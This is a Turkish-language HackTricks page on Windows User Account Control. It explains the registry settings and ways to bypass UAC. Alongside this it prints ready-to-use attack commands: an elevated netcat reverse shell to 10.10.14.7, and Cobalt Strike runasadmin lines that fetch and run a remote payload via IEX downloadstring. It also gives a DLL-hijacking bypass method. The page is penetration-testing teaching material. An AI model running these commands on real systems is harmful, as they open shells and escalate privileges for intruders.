# UAC - Kullanıcı Hesap Denetimi

<details>

<summary><strong>AWS hackleme becerilerinizi sıfırdan ileri seviyeye taşıyın</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u takip edin.
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR göndererek paylaşın.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Kullanıcı Hesap Denetimi (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için onay istemi** sağlayan bir özelliktir. Uygulamaların farklı `bütünlük` seviyeleri vardır ve **yüksek seviyede** bir program, **sistemi tehlikeye atabilecek görevleri gerçekleştirebilir**. UAC etkin olduğunda, uygulamalar ve görevler her zaman bir yönetici hesabının güvenlik bağlamı altında çalışır, yönetici bu uygulamaların/görevlerin sisteme yönetici düzeyinde erişim sağlaması için açıkça yetkilendirmesi gerekmektedir. Bu, yöneticileri istenmeyen değişikliklerden koruyan bir kolaylık özelliğidir, ancak bir güvenlik sınırı olarak kabul edilmez.

Daha fazla bütünlük seviyesi hakkında bilgi için:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

UAC etkin olduğunda, yönetici kullanıcıya 2 belirteç verilir: düzenli düzeyde düzenli işlemleri gerçekleştirmek için bir standart kullanıcı anahtarı ve yönetici ayrıcalıklarına sahip olan bir anahtar.

Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), UAC'nin nasıl çalıştığı, oturum açma işlemi, kullanıcı deneyimi ve UAC mimarisi hakkında ayrıntılı bilgileri tartışmaktadır. Yöneticiler, yerel düzeyde (secpol.msc kullanarak) veya bir Active Directory etki alanı ortamında Grup İlkesi Nesneleri (GPO) aracılığıyla yapılandırılarak ve dağıtılarak UAC'nin nasıl çalışacağını kuruluşlarına özgü olarak yapılandırmak için güvenlik politikalarını kullanabilirler. Çeşitli ayarlar ayrıntılı olarak [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) tartışılmaktadır. UAC için ayarlanabilecek 10 Grup İlkesi ayarı vardır. Aşağıdaki tablo ek ayrıntıları sağlar:

| Grup İlkesi Ayarı                                                                                                                                                                                                                                                                                                                                                             | Kayıt Defteri Anahtarı      | Varsayılan Ayar                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Yerleşik Yönetici hesabı için Kullanıcı Hesap Denetimi: Yönetici Onay Modu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Devre Dışı Bırakıldı                                        |
| [UIAccess uygulamalarının güvenli masaüstü kullanmadan yükseltme için istekte bulunmasına izin verme](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Devre Dışı Bırakıldı                                        |
| [Yönetici Onay Modunda yöneticiler için yükseltme isteği davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Windows dışı ikili dosyalar için onay iste                  |
| [Standart kullanıcılar için yükseltme isteği davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Güvenli masaüstünde kimlik bilgileri için onay iste         |
| [Uygulama yüklemelerini algıla ve yükseltme için istekte bulun](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Etkin (ev için varsayılan) Devre Dışı (kurumsal için varsayılan) |
| [Yalnızca imzalı ve doğrulanan yürütülebilirleri yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Devre Dışı Bırakıldı                                        |
| [Güvenli konumlarda yüklü olan yalnızca UIAccess uygulamalarını yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Etkin                                                        |
| [Tüm yöneticileri Yönetici Onay Modunda çalıştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Etkin                                                        |
| [Yükseltme için güvenli masaüstüne geç](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Etkin                                                        |
| [Dosya ve kayıt defteri yazma hatalarını kullanıcı başına konumlara sanallaştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Etkin                                                        |
### UAC Atlatma Teorisi

Bazı programlar, kullanıcının yönetici grubuna ait olması durumunda otomatik olarak **otomatik olarak yükseltilir**. Bu ikili dosyaların içinde, _**Manifestolar**_ içinde _**autoElevate**_ seçeneği _**True**_ değeriyle bulunur. İkili dosyanın ayrıca **Microsoft tarafından imzalanmış** olması gerekir.

Dolayısıyla, **UAC'yi atlamak** (orta bütünlük seviyesinden yüksek seviyeye yükseltmek) için bazı saldırganlar, bu tür ikili dosyaları kullanarak keyfi kodu **yürütmeyi** tercih ederler çünkü bu, **yüksek seviye bütünlük işleminden** yürütülecektir.

Bir ikili dosyanın _**Manifestosunu**_ Sysinternals'den _**sigcheck.exe**_ aracını kullanarak kontrol edebilirsiniz. Ve işlemlerin bütünlük seviyesini Sysinternals'in _Process Explorer_ veya _Process Monitor_ aracıyla görebilirsiniz.

### UAC Kontrolü

UAC'nin etkin olup olmadığını doğrulamak için şunu yapın:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Eğer **`1`** ise UAC **etkinleştirilmiştir**, **`0`** veya **var olmazsa**, UAC **etkin değildir**.

Ardından, yapılandırılan **hangi seviye**nin olduğunu kontrol edin:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Eğer **`0`** ise, UAC (Kullanıcı Hesabı Denetimi) sormaz (devre dışı gibi)
* Eğer **`1`** ise, yöneticiye yüksek haklarla birlikte ikiliyi çalıştırmak için kullanıcı adı ve şifre sorulur (Güvenli Masaüstü üzerinde)
* Eğer **`2`** ise (**Her zaman bildir**) UAC, yönetici bir şeyi yüksek ayrıcalıklarla çalıştırmaya çalıştığında her zaman onay isteyecektir (Güvenli Masaüstü üzerinde)
* Eğer **`3`** ise, `1` gibi ancak Güvenli Masaüstü üzerinde gerekli değil
* Eğer **`4`** ise, `2` gibi ancak Güvenli Masaüstü üzerinde gerekli değil
* Eğer **`5`** ise (**varsayılan**), yöneticiden yüksek ayrıcalıklarla Windows dışı ikili dosyaları çalıştırmayı onaylamasını isteyecektir

Ardından, **`LocalAccountTokenFilterPolicy`** değerine bakmanız gerekmektedir.\
Eğer değer **`0`** ise, sadece **RID 500** kullanıcısı (**yerleşik Yönetici**) UAC olmadan yönetici görevlerini gerçekleştirebilir ve eğer değer **`1`** ise, "Yöneticiler" grubundaki **tüm hesaplar** bunları yapabilir.

Ve son olarak, **`FilterAdministratorToken`** anahtarının değerine bakmanız gerekmektedir.\
Eğer **`0`** (varsayılan) ise, **yerleşik Yönetici hesabı** uzaktan yönetim görevlerini yapabilir ve eğer **`1`** ise, yerleşik Yönetici hesabı, `LocalAccountTokenFilterPolicy` değeri `1` olarak ayarlanmadıkça uzaktan yönetim görevlerini yapamaz.

#### Özet

* Eğer `EnableLUA=0` veya **mevcut değilse**, **hiç kimse için UAC yok**
* Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=1` ise, hiç kimse için UAC yok**
* Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=0` ise, RID 500 (Yerleşik Yönetici) için UAC yok**
* Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=1` ise, herkes için UAC var**

Bu bilgilere **metasploit** modülü kullanılarak erişilebilir: `post/windows/gather/win_privs`

Ayrıca kullanıcınızın gruplarını kontrol edebilir ve bütünlük seviyesini alabilirsiniz:
```
net user %username%
whoami /groups | findstr Level
```
## UAC atlatma

{% hint style="info" %}
Not: Eğer kurbanın grafiksel erişimi varsa, UAC atlatma işlemi oldukça basittir çünkü UAC uyarısı göründüğünde sadece "Evet"e tıklamanız yeterlidir.
{% endhint %}

UAC atlatma, aşağıdaki durumda gereklidir: **UAC etkinleştirilmiş durumda, işleminiz orta bütünlük bağlamında çalışıyor ve kullanıcınız yöneticiler grubuna ait**.

UAC'nin en yüksek güvenlik seviyesinde (Her zaman) olduğu durumlarda UAC atlatmanın, diğer seviyelerde (Varsayılan) olduğundan **çok daha zor olduğunu belirtmek önemlidir**.

### UAC devre dışı

Eğer UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`**) şu şekilde bir şey kullanarak **yönetici ayrıcalıklarıyla (yüksek bütünlük seviyesi) tersine kabuk çalıştırabilirsiniz**:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Token çoğaltma ile UAC atlatma

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Çok Temel UAC "atlatma" (tam dosya sistemi erişimi)

Eğer Yöneticiler grubunda bir kullanıcıya sahip bir kabukunuz varsa, SMB (dosya sistemi) üzerinden C$ paylaşımını **bağlayabilirsiniz** ve yeni bir diskte yerel olarak kullanabilirsiniz, böylece **dosya sistemi içindeki her şeye erişebilirsiniz** (hatta Yönetici'nin ev klasörüne bile). 

{% hint style="warning" %}
**Bu hile artık çalışmıyor gibi görünüyor**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt Strike ile UAC atlatma

Cobalt Strike teknikleri, UAC maksimum güvenlik seviyesinde ayarlanmamışsa çalışacaktır.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** ve **Metasploit** ayrıca **UAC**'yi atlamak için birkaç modül içerir.

### KRBUACBypass

Belgeler ve araç [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) adresinde bulunabilir.

### UAC atlatma saldırıları

[**UACME**](https://github.com/hfiref0x/UACME), birkaç UAC atlatma saldırısının derlemesidir. UACME'yi visual studio veya msbuild kullanarak derlemeniz gerekecektir. Derleme, birkaç yürütülebilir dosya oluşturacaktır (örneğin `Source\Akagi\outout\x64\Debug\Akagi.exe`). Hangisine ihtiyacınız olduğunu bilmelisiniz.\
Dikkatli olmanız gerekmektedir çünkü bazı atlatmalar, kullanıcıya bir şeylerin olduğunu bildiren diğer programları tetikleyebilir.

UACME, her tekniğin hangi sürümde çalışmaya başladığını gösteren derleme sürümüne sahiptir. Sizin sürümlerinizi etkileyen bir teknik arayabilirsiniz:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ayrıca, [bu](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) sayfayı kullanarak Windows sürümünü `1607` olarak alabilirsiniz.

#### Daha fazla UAC atlatma

Burada kullanılan **tüm** teknikler, UAC'yi atlatmak için kurbanla **tam etkileşimli bir kabuk** gerektirir (genel bir nc.exe kabuğu yeterli değildir).

Bir **meterpreter** oturumu kullanarak elde edebilirsiniz. Oturumu **1** olan bir **işlem**e geçin:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ çalışmalı)

### GUI ile UAC Atlatma

Eğer bir **GUI'ye erişiminiz varsa, UAC uyarısını** aldığınızda sadece kabul edebilirsiniz, gerçekten bir atlatmaya ihtiyacınız yoktur. Bu nedenle, bir GUI'ye erişim sağlamak, UAC'yi atlatmanıza olanak tanır.

Ayrıca, birisi tarafından kullanılan bir GUI oturumu elde ederseniz (potansiyel olarak RDP aracılığıyla), [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) gibi yönetici olarak çalışan **bazı araçlar** vardır. Bu araçlar sayesinde UAC tarafından tekrar uyarı almadan doğrudan bir **cmd** veya başka bir şeyi **yönetici olarak çalıştırabilirsiniz**. Bu biraz daha **gizli** olabilir.

### Gürültülü brute-force UAC atlatma

Ses çıkarmaktan endişe etmiyorsanız, her zaman [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir şeyi çalıştırabilirsiniz. Bu, kullanıcı izinlerini yükseltmeyi kabul edene kadar izinleri yükseltmenizi isteyecektir.

### Kendi atlatmanız - Temel UAC atlatma metodolojisi

**UACME**'ye bir göz atarsanız, **çoğu UAC atlatmanın Dll Hijacking zafiyetini** (kötü niyetli dll'yi _C:\Windows\System32_ üzerine yazma) kullandığını göreceksiniz. [Dll Hijacking zafiyeti nasıl bulunacağını öğrenmek için bunu okuyun](../windows-local-privilege-escalation/dll-hijacking.md).

1. **Otomatik olarak yükselten** bir ikili bulun (çalıştırıldığında yüksek bütünlük seviyesinde çalıştığını kontrol edin).
2. Procmon ile **"NAME NOT FOUND"** olaylarını bulun ve **DLL Hijacking** için zafiyetli olabilecek olayları tespit edin.
3. Muhtemelen DLL'yi bazı **korunan yollara** (örneğin C:\Windows\System32) yazmanız gerekecektir. Yazma izninizin olmadığı yerlerde bunu aşmak için şunları kullanabilirsiniz:
   1. **wusa.exe**: Windows 7, 8 ve 8.1. Bu araç, korunan yollara bir CAB dosyasının içeriğini çıkarmaya izin verir (çünkü bu araç yüksek bütünlük seviyesinden çalıştırılır).
   2. **IFileOperation**: Windows 10.
4. DLL'nizi korunan yola kopyalamak ve zafiyetli ve otomatik yükseltilen ikiliyi çalıştırmak için bir **komut dosyası** hazırlayın.

### Başka bir UAC atlatma tekniği

Bu teknik, bir **otomatik yükseltilen ikili**nin bir **kayıttan** bir **ikili** veya **komutun adını/yolunu** **okumaya** çalışıp çalışmadığını izlemekten oluşur (bu, ikilinin bu bilgiyi **HKCU** içinde araması daha ilginçtir).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturmanıza ve otomatikleştirmenize olanak tanıyan [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **tanıtmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerine**](https://peass.creator-spring.com) göz atın
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek katkıda bulunun.

</details>
